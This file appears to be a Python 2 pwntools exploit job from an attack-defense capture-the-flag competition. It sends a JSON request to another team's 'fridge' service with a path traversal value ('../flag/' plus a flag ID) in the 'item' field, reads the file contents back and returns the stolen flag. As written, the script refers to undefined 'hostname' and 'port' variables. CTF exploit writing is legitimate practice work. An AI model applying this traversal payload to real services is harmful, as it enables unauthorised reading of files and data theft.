#!/usr/bin/env python2
# -*- coding: utf-8 -*-

import json
from pwn import *

'''
	   {
           'team_name' : "Team name",
           'hostname' : "hostname",
           'port' : <int port number>,
           'flag_id' : "Flag ID to steal",
           'team_id': <int team id>
       },
'''

def runJob(d):
	# any stdout in here gets redirected to the log file
	# you can check this log by either looking at the log file (same directory),
	# or by using the command 'print <job name> [number of lines]' in the launcher

	s = remote(hostname, port)

	data = {}
	data['service'] = "fridge"
	data['op'] = 'getfridge'
	data['item'] = "../flag/"+d['flag_id']

	s.sendline(json.dumps(data))

	trash = s.recvuntil('"content":"')
	flag = s.recvuntil("\n").strip()

	return flag # return flag if successful, False otherwise
 
def fakeJob(ip):
	return True # Return anything not False here